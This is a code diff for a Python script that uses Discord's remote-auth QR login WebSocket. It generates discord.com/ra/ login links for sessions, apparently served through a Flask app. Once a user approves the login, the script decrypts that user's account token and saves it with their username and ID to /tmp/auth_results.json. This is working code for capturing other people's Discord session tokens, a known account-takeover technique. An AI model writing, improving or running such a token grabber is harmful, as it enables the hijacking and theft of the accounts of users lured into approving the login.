@@ -10,10 +10,27 @@ from Crypto.PublicKey import RSA
 import sys
 import os
 
-# --- Global state to share data with Flask app (you can also use a small DB) ---
-# We'll use a simple dictionary for this example. In a real app, use Redis or a database.
-active_sessions = {}
-session_user_data = {}
+# File‑based session store (works across processes on the same server)
+SESSION_FILE = "/tmp/auth_sessions.json"
+RESULT_FILE = "/tmp/auth_results.json"
+
+def save_session(session_id, fingerprint):
+    data = {}
+    if os.path.exists(SESSION_FILE):
+        with open(SESSION_FILE, 'r') as f:
+            data = json.load(f)
+    data[session_id] = fingerprint
+    with open(SESSION_FILE, 'w') as f:
+        json.dump(data, f)
+
+def save_result(session_id, user_data):
+    data = {}
+    if os.path.exists(RESULT_FILE):
+        with open(RESULT_FILE, 'r') as f:
+            data = json.load(f)
+    data[session_id] = user_data
+    with open(RESULT_FILE, 'w') as f:
+        json.dump(data, f)
 
 class DiscordAuthWebsocket:
     WS_ENDPOINT = 'wss://remote-auth-gateway.discord.gg/?v=2'
@@ -29,10 +46,9 @@ class DiscordAuthWebsocket:
         self.ws = None
         self.should_stop = False
         self.user_data = None
-        self.completed = False
 
     def run(self):
-        print(f"Starting WebSocket for session {self.session_id}")
+        print(f"[Listener] Starting WebSocket for session {self.session_id}")
         self.ws = websocket.WebSocketApp(
             self.WS_ENDPOINT,
             on_open=self.on_open,
@@ -43,7 +59,6 @@ class DiscordAuthWebsocket:
         )
         self.ws.run_forever()
 
-    # ... (keep the rest of your methods: send, heartbeat_sender, decrypt_payload, on_open, etc.) ...
     def send(self, op, data=None):
         payload = {'op': op}
         if data:
@@ -64,24 +79,32 @@ class DiscordAuthWebsocket:
         return self.cipher.decrypt(payload)
 
     def on_open(self, ws):
-        self.send('init', {'encoded_public_key': self.public_key})
+        pub = self.key.publickey().export_key().decode()
+        pub_key = ''.join(pub.split('\n')[1:-1])
+        self.send('init', {'encoded_public_key': pub_key})
 
     def on_message(self, ws, message):
         data = json.loads(message)
         op = data.get('op')
+
         if op == 'hello':
             self.heartbeat_interval = data.get('heartbeat_interval') / 1000
             self.last_heartbeat = time.time()
             threading.Thread(target=self.heartbeat_sender, daemon=True).start()
+
         elif op == 'nonce_proof':
             nonce = data.get('encrypted_nonce')
-            decrypted_nonce = self.decrypt_payload(nonce)
-            proof = SHA256.new(data=decrypted_nonce).digest()
+            decrypted = self.decrypt_payload(nonce)
+            proof = SHA256.new(decrypted).digest()
             proof = base64.urlsafe_b64encode(proof).decode().rstrip('=')
             self.send('nonce_proof', {'proof': proof})
+
         elif op == 'pending_remote_init':
             self.current_fingerprint = data.get('fingerprint')
-            active_sessions[self.session_id] = self.current_fingerprint
+            auth_url = f"https://discord.com/ra/{self.current_fingerprint}"
+            save_session(self.session_id, auth_url)
+            print(f"[Listener] Session {self.session_id} -> {auth_url}")
+
         elif op == 'pending_ticket':
             encrypted_payload = data.get('encrypted_user_payload')
             payload = self.decrypt_payload(encrypted_payload).decode()
@@ -92,6 +115,8 @@ class DiscordAuthWebsocket:
                 'avatar': values[2],
                 'username': values[3]
             }
+            print(f"[Listener] Got user {values[3]}#{values[1]} for {self.session_id}")
+
         elif op == 'pending_login':
             ticket = data.get('ticket')
             try:
@@ -100,33 +125,41 @@ class DiscordAuthWebsocket:
                     encrypted_token = resp.json().get('encrypted_token')
                     token = self.decrypt_payload(encrypted_token).decode()
                     self.user_data['token'] = token
-                    self.completed = True
-                    session_user_data[self.session_id] = self.user_data
+                    save_result(self.session_id, self.user_data)
+                    print(f"[Listener] Token saved for {self.session_id}")
                     self.should_stop = True
                     ws.close()
+                else:
+                    print(f"[Listener] Token exchange failed: {resp.text}")
             except Exception as e:
-                print(f"Token exchange error: {e}")
+                print(f"[Listener] Token exchange error: {e}")
 
-    # ... (error/close handlers and public_key property) ...
+    def on_error(self, ws, error):
+        print(f"[Listener] WebSocket error: {error}")
 
-# Function to be called from Flask
-def start_auth_session(session_id):
-    auth_ws = DiscordAuthWebsocket(session_id)
-    thread = threading.Thread(target=auth_ws.run, daemon=True)
+    def on_close(self, ws, status, msg):
+        print(f"[Listener] WebSocket closed: {status} {msg}")
+
+def start_session(session_id):
+    """Start a WebSocket session for the given session_id in the background."""
+    ws_client = DiscordAuthWebsocket(session_id)
+    thread = threading.Thread(target=ws_client.run, daemon=True)
     thread.start()
-    # Wait for fingerprint
+    # Wait a few seconds for the fingerprint to appear
     timeout = 10
-    while session_id not in active_sessions and timeout > 0:
+    while timeout > 0:
+        if os.path.exists(SESSION_FILE):
+            with open(SESSION_FILE, 'r') as f:
+                data = json.load(f)
+                if session_id in data:
+                    return data[session_id]  # auth_url
         time.sleep(0.2)
         timeout -= 0.2
-    fingerprint = active_sessions.pop(session_id, None)
-    if fingerprint:
-        return f"https://discord.com/ra/{fingerprint}"
     return None
 
-# ... (you can also add a function to get the user data) ...
-
-if __name__ == '__main__':
-    # Keep the script alive
+if __name__ == "__main__":
+    # This script is meant to be run as a background process.
+    # It will keep running forever, listening for new sessions.
+    print("[Listener] Ready to accept sessions")
     while True:
-        time.sleep(60)
+        time.sleep(60)   # Keep alive
